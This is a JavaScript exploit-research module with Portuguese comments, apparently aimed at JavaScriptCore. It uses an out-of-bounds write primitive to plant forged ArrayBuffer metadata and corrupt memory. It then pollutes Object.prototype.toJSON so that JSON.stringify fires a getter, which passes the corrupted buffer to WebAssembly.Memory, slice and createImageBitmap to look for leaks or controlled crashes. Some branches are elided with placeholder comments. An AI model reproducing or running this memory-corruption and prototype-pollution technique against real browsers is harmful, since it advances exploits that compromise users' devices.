// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForApiTest";
let getter_called_flag = false;
let current_test_results = { success: false, message: "Teste não iniciado.", error: null, info: null };

// Metadados sombra (podem não ser usados diretamente, mas mantemos a configuração)
const SHADOW_DATA_POINTER = new AdvancedInt64(0x1, 0x0);
const SHADOW_SIZE = new AdvancedInt64(0x1000, 0x0);

class CheckpointObjectForApiTest {
    constructor(id) {
        this.id = `ApiTestCheckpoint-${id}`;
    }
}

export function toJSON_TriggerApiTestGetter() {
    const FNAME_toJSON = "toJSON_TriggerApiTestGetter";
    if (this instanceof CheckpointObjectForApiTest) {
        logS3(`toJSON: 'this' é Checkpoint. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        try {
            // eslint-disable-next-line no-unused-vars
            const val = this[GETTER_CHECKPOINT_PROPERTY_NAME]; // Aciona o getter
        } catch (e) {
            logS3(`toJSON: Erro ao acessar getter: ${e.message}`, "error", FNAME_toJSON);
        }
    }
    return this.id;
}

export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
    const FNAME_TEST = "executeApiInteractionTest"; // Nome interno
    logS3(`--- Iniciando Teste de Interação com API no Getter ---`, "test", FNAME_TEST);

    getter_called_flag = false;
    current_test_results = { success: false, message: "Teste não executado ou getter não chamado.", error: null, info: null };

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { /* ... validação ... */ return; }

    let toJSONPollutionApplied = false;
    let getterPollutionApplied = false;
    let originalToJSONProtoDesc = null;
    let originalGetterDesc = null;
    const ppKey_val = 'toJSON';

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { /* ... erro ... */ return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);

        // 1. Plantar "Metadados Sombra"
        const shadow_contents_offset_in_oob_data = 0x0;
        oob_write_absolute(shadow_contents_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, SHADOW_SIZE, 8);
        oob_write_absolute(shadow_contents_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, SHADOW_DATA_POINTER, 8);
        logS3(`Metadados sombra plantados: ptr=${SHADOW_DATA_POINTER.toString(true)}, size=${SHADOW_SIZE.toString(true)}`, "info", FNAME_TEST);

        // 2. Realizar a escrita OOB "gatilho"
        const corruption_trigger_offset_abs = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
        const corruption_value = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
        oob_write_absolute(corruption_trigger_offset_abs, corruption_value, 8);
        logS3(`Escrita OOB gatilho em ${toHex(corruption_trigger_offset_abs)} do oob_data completada.`, "info", FNAME_TEST);

        // 3. Configurar o getter e poluir
        const checkpoint_obj = new CheckpointObjectForApiTest(1);
        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForApiTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);

        Object.defineProperty(CheckpointObjectForApiTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
            get: function() {
                getter_called_flag = true;
                const FNAME_GETTER = "ApiTest_Getter";
                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Testando APIs...`, "vuln", FNAME_GETTER);
                current_test_results = { success: false, message: "Getter chamado, teste de API em andamento.", error: null, info: null };

                let info_observed = [];

                // Teste 1: WebAssembly.Memory
                // WebAssembly.Memory espera um descritor com 'initial' e opcionalmente 'maximum' e 'shared'.
                // Passar um ArrayBuffer diretamente é um uso incorreto.
                try {
                    logS3("DENTRO DO GETTER (API Test 1): new WebAssembly.Memory(oob_array_buffer_real)...", "info", FNAME_GETTER);
                    // @ts-ignore  Intencionalmente passando tipo errado
                    let wa_mem = new WebAssembly.Memory(oob_array_buffer_real);
                    info_observed.push(`WebAssembly.Memory(oob_ab) SUCESSO INESPERADO. Buffer length: ${wa_mem.buffer?.byteLength}`);
                    logS3(`DENTRO DO GETTER (API Test 1): WebAssembly.Memory criado INESPERADAMENTE. Buffer: ${wa_mem.buffer}`, "warn", FNAME_GETTER);
                } catch (e) {
                    info_observed.push(`WebAssembly.Memory(oob_ab) Erro: ${e.message}`);
                    logS3(`DENTRO DO GETTER (API Test 1): Erro esperado com WebAssembly.Memory(oob_ab): ${e.message}`, "good", FNAME_GETTER);
                    if (String(e.message).length > 100 || String(e.message).includes("0x")) { // Heurística para erro verboso
                        current_test_results.success = true; // Sucesso especulativo se o erro for muito detalhado
                        current_test_results.message = "WebAssembly.Memory causou erro potencialmente informativo.";
                    }
                }

                // Teste 2: PostMessage (comum para transferir ArrayBuffers)
                try {
                    logS3("DENTRO DO GETTER (API Test 2): self.postMessage(oob_array_buffer_real, '*')", "info", FNAME_GETTER);
                    // @ts-ignore Verifica se postMessage está disponível (ex: em Worker ou main thread)
                    if (typeof self !== 'undefined' && self.postMessage) {
                        // Para evitar erro "DataCloneError" se o AB estiver "detached" ou corrompido de forma estranha.
                        // Precisaria de um MessageChannel para um teste mais robusto ou um worker.
                        // Aqui apenas chamamos para ver se causa um erro imediato diferente do normal.
                        // self.postMessage({ab_test: oob_array_buffer_real}, '*'); // Enviar como parte de um objeto
                        // Se o ArrayBuffer for transferível e corrompido, pode dar um erro interessante.
                        // Para simplificar e evitar dependência de setup de worker, vamos apenas simular
                        // uma operação que poderia falhar de forma interessante se o AB estiver esquisito.
                        // Tentando um slice, que já testamos, mas o contexto é diferente.
                        let slice = oob_array_buffer_real.slice(0,1);
                        info_observed.push(`postMessage-like (slice): slice.byteLength = ${slice.byteLength}`);
                         logS3(`DENTRO DO GETTER (API Test 2): Slice para simular postMessage OK. Length: ${slice.byteLength}`, "info", FNAME_GETTER);
                    } else {
                        info_observed.push("self.postMessage não disponível neste contexto.");
                         logS3("DENTRO DO GETTER (API Test 2): self.postMessage não disponível.", "warn", FNAME_GETTER);
                    }
                } catch (e) {
                    info_observed.push(`postMessage-like (slice) Erro: ${e.message}`);
                    logS3(`DENTRO DO GETTER (API Test 2): Erro com postMessage-like (slice): ${e.message}`, "error", FNAME_GETTER);
                     if (String(e.message).length > 100 || String(e.message).includes("0x") || String(e.message).toLowerCase().includes("internal error")) {
                        current_test_results.success = true;
                        current_test_results.message = "postMessage-like (slice) causou erro potencialmente informativo.";
                    }
                }
                
                // Teste 3: ImageBitmap (se disponível)
                // createImageBitmap pode ter tratamento especial para ArrayBuffers (ex: pixel data)
                // @ts-ignore Verifica se createImageBitmap está disponível
                if (typeof createImageBitmap !== 'undefined') {
                    try {
                        logS3("DENTRO DO GETTER (API Test 3): createImageBitmap(oob_dataview_real)... (esperando erro)", "info", FNAME_GETTER);
                        // createImageBitmap espera ImageData, Blob, etc. Passar DataView diretamente é incorreto.
                        // Ou um objeto { data: ArrayBufferView, width: number, height: number }
                        // @ts-ignore
                        await createImageBitmap(oob_dataview_real); // Passando DataView
                        info_observed.push(`createImageBitmap(oob_dv) SUCESSO INESPERADO.`);
                        logS3(`DENTRO DO GETTER (API Test 3): createImageBitmap com oob_dataview_real INESPERADAMENTE bem-sucedido.`, "warn", FNAME_GETTER);
                    } catch (e) {
                        info_observed.push(`createImageBitmap(oob_dv) Erro: ${e.message}`);
                        logS3(`DENTRO DO GETTER (API Test 3): Erro esperado com createImageBitmap(oob_dv): ${e.message}`, "good", FNAME_GETTER);
                        if (String(e.message).length > 80 || String(e.message).includes("0x") || String(e.message).toLowerCase().includes("internal error")) {
                            current_test_results.success = true; // Sucesso especulativo se o erro for muito detalhado
                            current_test_results.message = "createImageBitmap causou erro potencialmente informativo.";
                        }
                    }
                } else {
                    info_observed.push("createImageBitmap não disponível.");
                    logS3("DENTRO DO GETTER (API Test 3): createImageBitmap não disponível.", "warn", FNAME_GETTER);
                }


                current_test_results.info = info_observed.join('; ');
                if (!current_test_results.success) { // Se nenhum dos testes acima marcou sucesso
                    current_test_results.message = "Testes de API no getter não revelaram leaks óbvios ou crashes controlados.";
                }
                return 0xBADF00D;
            },
            configurable: true
        });
        getterPollutionApplied = true;

        originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        Object.defineProperty(Object.prototype, ppKey_val, {value: toJSON_TriggerApiTestGetter, writable: true, enumerable: false, configurable: true});
        toJSONPollutionApplied = true;
        logS3(`Poluições aplicadas.`, "info", FNAME_TEST);

        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) {
            logS3(`Erro JSON.stringify: ${e.message}`, "error", FNAME_TEST);
        }

    } catch (mainError) { /* ... erro principal ... */ }
    finally { /* ... limpeza ... */ }

    if (getter_called_flag) {
        logS3(`RESULTADO TESTE API: Getter chamado. Sucesso especulativo: ${current_test_results.success}. Msg: ${current_test_results.message}. Info: ${current_test_results.info}`, 
              current_test_results.success ? "vuln" : "warn", FNAME_TEST);
    } else { /* ... getter não chamado ... */ }
    logS3(`  Detalhes finais: ${JSON.stringify(current_test_results)}`, "info", FNAME_TEST);

    clearOOBEnvironment();
    logS3(`--- Teste de Interação com API Concluído ---`, "test", FNAME_TEST);
}
